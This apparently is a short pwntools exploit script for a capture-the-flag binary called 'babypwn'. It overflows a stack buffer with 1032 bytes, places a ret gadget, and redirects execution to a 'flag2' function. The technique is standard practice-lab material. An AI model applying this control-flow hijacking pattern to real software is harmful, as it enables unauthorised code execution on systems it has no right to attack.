from pwn import *

e = ELF('./babypwn')
p = process('./babypwn')

ret_addr = 0x00400451
flag2_addr = e.symbols['flag2']

payload = 'A'*1032
payload += p64(ret_addr)
payload += p64(flag2_addr)

p.sendline(payload)
p.interactive()
print p.recv()